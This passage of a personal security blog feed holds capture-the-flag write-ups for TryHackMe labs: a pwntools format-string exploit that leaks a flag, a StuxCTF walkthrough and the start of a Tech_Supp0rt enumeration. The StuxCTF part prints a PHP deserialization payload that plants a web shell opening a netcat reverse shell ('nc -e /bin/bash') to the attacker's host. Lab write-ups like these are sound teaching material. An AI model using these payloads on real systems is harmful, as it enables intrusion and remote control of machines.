+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file Checks</span>
+
+file pwn106user.pwn106-user 
+pwn106user.pwn106-user: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>60a1dfa10c02bcc6d113cb752053893ac9e2f4f1, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
+
+checksec pwn106user.pwn106-user 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall6/pwn106user.pwn106-user'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+<span class="c"># Executing binary to get more info</span>
+
+./pwn106user.pwn106-user
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 107          
+
+🎉 THM Giveaway 🎉
+
+Enter your THM username to participate <span class="k">in </span>the giveaway: void
+
+Thanks void
+
+
+</code></pre></div></div>
+
+<p>Ghidra analysis</p>
+
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn106.png" alt="pwn106.png" /></p>
+
+<p>Here we can clearly see that it takes a input from us and then print it back to up … but here’s the twist as the programmer dosen’t specify format specifier we can provide our own format specifier to leak values from the stack.</p>
+
+<p>Our exploit</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># chall6/get_flag.py 
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
+
+<span class="n">flag</span><span class="o">=</span><span class="s">""</span>
+
+<span class="c1"># Lets fuzzx values
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">12</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># connect to server
+</span>        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.145.112"</span><span class="p">,</span><span class="mi">9006</span><span class="p">,</span><span class="n">level</span><span class="o">=</span><span class="s">'warn'</span><span class="p">)</span>
+        <span class="c1"># io=process('./vuln',level='warn')
+</span>        <span class="c1"># Format the counter
+</span>        <span class="c1"># e.g %i$p will attempt to print [i]th pointer (or string/hex/char/int)
+</span>        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'%{}$p'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+        <span class="c1"># Recieve the response (leaked addresses followed by '.' in this case)
+</span>        <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Thanks "</span><span class="p">)</span>
+        <span class="n">result</span><span class="o">=</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="sa">b</span><span class="s">'nil'</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="c1"># Decode, reverse endianess and print
+</span>                <span class="n">decoded</span> <span class="o">=</span> <span class="n">unhex</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">()[</span><span class="mi">2</span><span class="p">:])</span>
+                <span class="n">reversed_hex</span> <span class="o">=</span> <span class="n">decoded</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+                <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">reversed_hex</span><span class="p">))</span>
+                <span class="c1"># Build the flag
+</span>                <span class="n">flag</span><span class="o">+=</span><span class="n">reversed_hex</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
+            <span class="k">except</span> <span class="nb">BaseException</span><span class="p">:</span>
+                <span class="k">pass</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">info</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 get_flag.py
+6:b<span class="s1">'0x5f5530797b4d4854\n'</span>
+b<span class="s1">'THM{y0U_'</span>
+7:b<span class="s1">'0x5f3368745f6e3077\n'</span>
+b<span class="s1">'w0n_th3_'</span>
+8:b<span class="s1">'0x5961774133766947\n'</span>
+b<span class="s1">'Giv3AwaY'</span>
+9:b<span class="s1">'0x3168745f446e615f\n'</span>
+b<span class="s1">'_anD_th1'</span>
+10:b<span class="s1">'0x756f595f73315f73\n'</span>
+b<span class="s1">'s_1s_You'</span>
+11:b<span class="s1">'0x7d47346c665f52\n'</span>
+b<span class="s1">'R_fl4G}'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> THM<span class="o">{</span>fake_flag<span class="o">}</span>   <span class="c"># get you own flag</span>
+
+
+</code></pre></div></div>
+
+<h2 id="challenge-7---pwn107">Challenge 7 - pwn107</h2>
+
+<p>The challenge is running on port 9007</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file checks</span>
+file pwn107.pwn107         
+pwn107.pwn107: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>0579b2a29d47165653fbb791fb528c59e951a1a0, not stripped
+
+checksec pwn107.pwn107         
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall7/pwn107.pwn107'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+
+</code></pre></div></div>
+
+<p>Comming soon…</p>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><summary type="html"><![CDATA[Void XD]]></summary></entry><entry><title type="html">Stuxctf</title><link href="http://localhost:4000/new_blog/posts/stuxctf/" rel="alternate" type="text/html" title="Stuxctf" /><published>2022-04-22T00:00:00+00:00</published><updated>2022-04-22T00:00:00+00:00</updated><id>http://localhost:4000/new_blog/posts/stuxctf</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/stuxctf/"><![CDATA[<blockquote>
+  <p>VOiD XD</p>
+</blockquote>
+
+<p>My IP : 10.8.253.221
+Target IP : 10.10.58.158</p>
+
+<h2 id="port-80-http">PORT 80 [http]</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+&lt;<span class="o">!</span><span class="nt">--</span> The secret directory is...
+p: 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251<span class="p">;</span>
+g: 7<span class="p">;</span>
+a: 330<span class="p">;</span>
+b: 450<span class="p">;</span>
+g^c: 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617<span class="p">;</span>
+		<span class="nt">--</span><span class="o">&gt;</span>
+
+/robots.txt
+<span class="c"># robots.txt generated by StuxCTF</span>
+<span class="c"># Diffie-Hellman</span>
+User-agent: <span class="k">*</span>
+Disallow: 
+Disallow: /StuxCTF/
+
+Solving it gives : 47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055
+
+
+   &lt;<span class="o">!</span><span class="nt">--</span> hint: /?file<span class="o">=</span> <span class="nt">--</span><span class="o">&gt;</span>
+
+view-source:http://10.10.58.158/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/index.php?file<span class="o">=</span>index.php
+
+unhex data | rev | <span class="nb">base64</span> <span class="nt">-d</span> file <span class="o">&gt;</span> index.php
+
+</code></pre></div></div>
+
+<p>Solved diffie-Hellman using this script :</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Diffie-Hellman solve script
+</span>
+<span class="n">p</span><span class="o">=</span><span class="mi">9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251</span>
+<span class="n">g</span><span class="o">=</span><span class="mi">7</span>
+<span class="n">a</span><span class="o">=</span><span class="mi">330</span>
+<span class="n">b</span><span class="o">=</span><span class="mi">450</span>
+
+<span class="n">gc</span> <span class="o">=</span> <span class="mi">6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617</span>
+
+
+<span class="n">gca</span> <span class="o">=</span> <span class="p">(</span><span class="n">gc</span><span class="o">**</span><span class="n">a</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
+<span class="n">gcab</span> <span class="o">=</span> <span class="p">(</span><span class="n">gca</span><span class="o">**</span><span class="n">b</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
+ 
+<span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">gcab</span><span class="p">)[:</span><span class="mi">128</span><span class="p">])</span>                                                                
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.tutorialspoint.com/execute_php_online.php
+
+<span class="cp">&lt;?php</span> 
+<span class="kd">class</span> <span class="nc">file</span><span class="p">{</span>
+	<span class="k">public</span> <span class="nv">$file</span><span class="o">=</span> <span class="s1">'myshell.php'</span><span class="p">;</span>
+	<span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">'&lt;?php shell_exec("nc -e /bin/bash 10.8.253.221 4444")?&gt;'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">file</span><span class="p">));</span>
+<span class="cp">?&gt;</span>
+
+</code></pre></div></div>
+
+<p>Gives the exploit</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">O</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="s">"file"</span><span class="p">:</span><span class="mi">2</span><span class="p">:{</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="s">"file"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="s">"shell.php"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="s">"data"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="s">"&lt;?php echo "</span><span class="n">Hey</span> <span class="err">!</span><span class="s">"; shell_exec("</span><span class="n">nc</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="mf">10.8</span><span class="p">.</span><span class="mf">253.221</span> <span class="mi">4444</span><span class="s">")?&gt;"</span><span class="p">;}</span> 
+</code></pre></div></div>
+
+<h2 id="shell-www-data">Shell [www-data]</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/home/grecia<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+0b6044b7807dd100b9e30f1bd09db53f
+
+www-data@ubuntu:/tmp<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on ubuntu:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
+
+root@ubuntu:~# <span class="nb">cat </span>root.txt 
+0028454003b42601548df551b738976c
+
+</code></pre></div></div>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><summary type="html"><![CDATA[VOiD XD]]></summary></entry><entry><title type="html">Tech_supp0rt: 1 Tryhackme</title><link href="http://localhost:4000/new_blog/posts/Tech_Supp0rt-1-Tryhackme/" rel="alternate" type="text/html" title="Tech_supp0rt: 1 Tryhackme" /><published>2022-04-19T00:00:00+00:00</published><updated>2022-04-19T00:00:00+00:00</updated><id>http://localhost:4000/new_blog/posts/Tech_Supp0rt:-1-Tryhackme</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/Tech_Supp0rt-1-Tryhackme/"><![CDATA[<blockquote>
+  <p>VOiD XD</p>
+</blockquote>
+
+<p>This is short writup for <a href="https://tryhackme.com/room/techsupp0rt1">Tech_Supp0rt: 1</a> (Hack into the scammer’s under-development website to foil their plans.) on <a href="https://tryhackme.com">tryhackme</a>
+Go check it out.</p>
+
+<blockquote>
+  <p>Target IP : 168.119.142.36</p>
+</blockquote>
+
+<h3 id="rustscan">Rustscan</h3>
+<p>Rustscan for quick open ports lookup.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># All ports scan</span>
+rustscan <span class="nt">-a</span> 10.10.203.0 <span class="nt">-b</span> 1000
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
+| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
+<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+🌍HACK THE PLANET🌍
+
+[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+[~] File limit higher than batch size. Can increase speed by increasing batch size '</span><span class="nt">-b</span> 924<span class="s1">'.
+Open 10.10.203.0:22
+Open 10.10.203.0:80
+Open 10.10.203.0:139
+Open 10.10.203.0:445
+[~] Starting Script(s)
+[&gt;] Script to be run Some("nmap -vvv -p  ")
+
+[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 05:30 EDT
+Initiating Ping Scan at 05:30
+Scanning 10.10.203.0 [2 ports]
+Completed Ping Scan at 05:30, 0.20s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 05:30
+Completed Parallel DNS resolution of 1 host. at 05:30, 0.02s elapsed
+DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 05:30
+Scanning 10.10.203.0 [4 ports]
+Discovered open port 80/tcp on 10.10.203.0
+Discovered open port 445/tcp on 10.10.203.0
+Discovered open port 139/tcp on 10.10.203.0
+Discovered open port 22/tcp on 10.10.203.0
+Completed Connect Scan at 05:30, 0.29s elapsed (4 total ports)
+Nmap scan report for 10.10.203.0
+Host is up, received syn-ack (0.24s latency).
+Scanned at 2022-04-19 05:30:38 EDT for 1s
+
+PORT    STATE SERVICE      REASON
+22/tcp  open  ssh          syn-ack
+80/tcp  open  http         syn-ack
+139/tcp open  netbios-ssn  syn-ack
+445/tcp open  microsoft-ds syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
+</span></code></pre></div></div>
+
+<h2 id="nmap">Nmap</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Version and Service Scans</span>
+
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-vv</span> 10.10.203.0 <span class="nt">-oN</span> scans/init 
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-04-19 05:28 EDT
+NSE: Loaded 155 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 05:28
+Completed NSE at 05:28, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 05:28
+Completed NSE at 05:28, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 05:28
+Completed NSE at 05:28, 0.00s elapsed
+Initiating Ping Scan at 05:28
+Scanning 10.10.203.0 <span class="o">[</span>2 ports]
+Completed Ping Scan at 05:28, 0.28s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating Parallel DNS resolution of 1 host. at 05:28
+Completed Parallel DNS resolution of 1 host. at 05:28, 0.02s elapsed
+Initiating Connect Scan at 05:28
+Scanning 10.10.203.0 <span class="o">[</span>1000 ports]
+Discovered open port 139/tcp on 10.10.203.0
+Discovered open port 445/tcp on 10.10.203.0
+Discovered open port 22/tcp on 10.10.203.0
+Discovered open port 80/tcp on 10.10.203.0
+Increasing send delay <span class="k">for </span>10.10.203.0 from 0 to 5 due to max_successful_tryno increase to 4
+Increasing send delay <span class="k">for </span>10.10.203.0 from 5 to 10 due to max_successful_tryno increase to 5
+Completed Connect Scan at 05:28, 29.82s elapsed <span class="o">(</span>1000 total ports<span class="o">)</span>
+Initiating Service scan at 05:28
+Scanning 4 services on 10.10.203.0
+Completed Service scan at 05:29, 11.82s elapsed <span class="o">(</span>4 services on 1 host<span class="o">)</span>
+NSE: Script scanning 10.10.203.0.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 05:29
+Completed NSE at 05:29, 9.83s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 05:29
+Completed NSE at 05:29, 1.44s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 05:29
+Completed NSE at 05:29, 0.00s elapsed
+Nmap scan report <span class="k">for </span>10.10.203.0
+Host is up, received syn-ack <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-04-19 05:28:29 EDT <span class="k">for </span>54s
+Not shown: 995 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT     STATE    SERVICE     REASON      VERSION
+22/tcp   open     ssh         syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtST3F95eem6k4V02TcUi7/Qtn3WvJGNfqpbE+7EVuN2etoFpihgP5LFK2i/EDbeIAiEPALjtKy3gFMEJ5QDCkglBYt3gUbYv29TQBdx+LZQ8Kjry7W+KCKXhkKJEVnkT5cN6lYZIGAkIAVXacZ/YxWjj+ruSAx07fnNLMkqsMR9VA+8w0L2BsXhzYAwCdWrfRf8CE1UEdJy6WIxRsxIYOk25o9R44KXOWT2F8pP2tFbNcvUMlUY6jGHmXgrIEwDiBHuwd3uG5cVVmxJCCSY6Ygr9Aa12nXmUE5QJE9lisYIPUn9IjbRFb2d2hZE2jQHq3WCGdAls2Bwnn7Rgc7J09
+|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClT+wif/EERxNcaeTiny8IrQ5Qn6uEM7QxRlouee7KWHrHXomCB/Bq4gJ95Lx5sRPQJhGOZMLZyQaKPTIaILNQ<span class="o">=</span>
+|   256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDolvqv0mvkrpBMhzpvuXHjJlRv/vpYhMabXxhkBxOwz
+80/tcp   open     http        syn-ack     Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+139/tcp  open     netbios-ssn syn-ack     Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+445/tcp  open     netbios-ssn syn-ack     Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+6792/tcp filtered unknown     no-response
+Service Info: Host: TECHSUPPORT<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2022-04-19T09:29:16
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows 6.1 <span class="o">(</span>Samba 4.3.11-Ubuntu<span class="o">)</span>
+|   Computer name: techsupport
+|   NetBIOS computer name: TECHSUPPORT<span class="se">\x</span>00
+|   Domain name: <span class="se">\x</span>00
+|   FQDN: techsupport
+|_  System <span class="nb">time</span>: 2022-04-19T14:59:14+05:30
+| p2p-conficker: 
+|   Checking <span class="k">for </span>Conficker.C or higher...
+|   Check 1 <span class="o">(</span>port 55287/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Couldn<span class="s1">'t connect)
+|   Check 2 (port 30605/tcp): CLEAN (Couldn'</span>t connect<span class="o">)</span>
+|   Check 3 <span class="o">(</span>port 34806/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 4 <span class="o">(</span>port 30218/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Failed to receive data<span class="o">)</span>
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: mean: <span class="nt">-1h49m58s</span>, deviation: 3h10m30s, median: 0s
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 05:29
+Completed NSE at 05:29, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 05:29
+Completed NSE at 05:29, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 05:29
+Completed NSE at 05:29, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>54.48 second
+</code></pre></div></div>
+
+<h2 id="port-139-smb">PORT 139 [smb]</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Smb Enumeration</span>
+smbclient <span class="nt">-L</span> 10.10.203.0
+Enter WORKGROUP<span class="se">\k</span>alis password: 
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	print<span class="nv">$ </span>         Disk      Printer Drivers
+	websvr          Disk      
+	IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>TechSupport server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+
+	Server               Comment
+	<span class="nt">---------</span>            <span class="nt">-------</span>
+
+	Workgroup            Master
+	<span class="nt">---------</span>            <span class="nt">-------</span>
+	WORKGROUP  
+
+
+smbclient <span class="se">\\\\</span>10.10.203.0<span class="se">\\</span>websvr
+Enter WORKGROUP<span class="se">\k</span>alis password: 
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Sat May 29 03:17:38 2021
+  ..                                  D        0  Sat May 29 03:03:47 2021
+  enter.txt                           N      273  Sat May 29 03:17:38 2021
+
+		8460484 blocks of size 1024. 5698820 blocks available
+
+
+smb: <span class="se">\&gt;</span> get enter.txt
+getting file <span class="se">\e</span>nter.txt of size 273 as enter.txt <span class="o">(</span>0.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.3 KiloBytes/sec<span class="o">)</span>
+
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Reading file we got</span>
+<span class="nb">cat </span>enter.txt         
+GOALS
+<span class="o">=====</span>
+1<span class="o">)</span>Make fake popup and host it online on Digital Ocean server
+2<span class="o">)</span>Fix subrion site, /subrion doesnt work, edit from panel
+3<span class="o">)</span>Edit wordpress website
+
+IMP
+<span class="o">===</span>
+Subrion creds
+|-&gt;admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk <span class="o">[</span>cooked with magical formula]
+Wordpress creds
+|-&gt;
+
+<span class="c"># Using cyberchef to decode </span>
+7sKvntXdPEJaxazce9PXi24zaFrLiKWCk <span class="nt">--</span><span class="o">&gt;</span> from base58 <span class="nt">--</span><span class="o">&gt;</span> from <span class="nb">base32</span> <span class="nt">--</span><span class="o">&gt;</span>from <span class="nb">base64</span> <span class="nt">--</span><span class="o">&gt;</span> gives Scam2021
+</code></pre></div></div>
+
+<h2 id="port-80-http">PORT 80 [http]</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Directory Enumeration</span>
+
+gobuster <span class="nb">dir</span> <span class="nt">--url</span> http://10.10.203.0 <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/dirb/common.txt <span class="nt">-t</span> 40 | <span class="nb">tee </span>go.log
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.203.0
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 40
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/04/19 05:43:13 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 11321]
+/phpinfo.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 94954]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]  
+/test                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.203.0/test/]
+/wordpress            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.203.0/wordpress/]
+                                                                                     
+<span class="o">===============================================================</span>
+2022/04/19 05:43:49 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
